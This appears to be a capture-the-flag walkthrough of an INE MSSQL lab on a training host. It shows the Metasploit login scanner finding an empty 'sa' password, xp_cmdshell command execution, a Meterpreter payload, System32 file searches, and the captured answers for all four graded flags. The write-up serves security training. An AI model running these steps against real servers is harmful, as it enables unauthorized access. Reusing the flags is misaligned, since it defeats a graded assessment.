## Completing Skill Check Labs
    Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

## Lab Environment
    In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at target.ine.local.

    Objective: Use Metasploit and manual investigation techniques to capture the following flags:

## Flag 1: Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
    scanner/mssql/mssql_login

        [*] 10.2.18.59:1433       - 10.2.18.59:1433 - MSSQL - Starting authentication scanner.
        [+] 10.2.18.59:1433       - 10.2.18.59:1433 - Login Successful: WORKSTATION\sa:
        [*] target.ine.local:1433 - Scanned 1 of 1 hosts (100% complete)
        [*] target.ine.local:1433 - Bruteforce completed, 1 credential was successful.
        [*] target.ine.local:1433 - You can open an MSSQL session with these credentials and CreateSession set to true
        [*] Auxiliary module execution completed

    
    impacket-mssqlclient sa@10.2.18.59
    EXEC xp_cmdshell 'whoami';
    windows/mssql/mssql_payload
        set DATABASE  master
        set PASSWORD ""
        set RHOSTS    target.ine.local
        set USERNAME  sa

    12d394e9f81d44abb6d1950eb2ba1494

## Flag 2: Locate the second flag within the Windows configuration folder.
    meterpreter > cat C:\windows\System32\config\flag2.txt 
        b97a95975ed84b20a6888f282a639c78    


## Flag 3: The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
    dir C:\Windows\System32\*.txt /s /b
        C:\Windows\System32\catroot2\dberr.txt
        C:\Windows\System32\config\flag2.txt
        C:\Windows\System32\config\systemprofile\AppData\Local\Amazon\Ec2Config\Logs\FrameworkLaunchException.txt
        C:\Windows\System32\drivers\gmreadme.txt
        C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
        C:\Windows\System32\en-US\erofflps.txt
        C:\Windows\System32\WindowsPowerShell\v1.0\en-US\default.help.txt
        C:\Windows\System32\WindowsPowerShell\v1.0\Modules\BitsTransfer\en-US\about_BITS_Cmdlets.help.txt

    type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
        6d979603073449808960204df57246e8


## Flag 4: Investigate the Administrator directory to find the fourth flag.
    meterpreter > cat C:\Users\Administrator\Desktop\flag4.txt 
        57748e62b99f420e8f91e7060e62c19f


## Tools
    Nmap
    Metasploit Framework
    mssql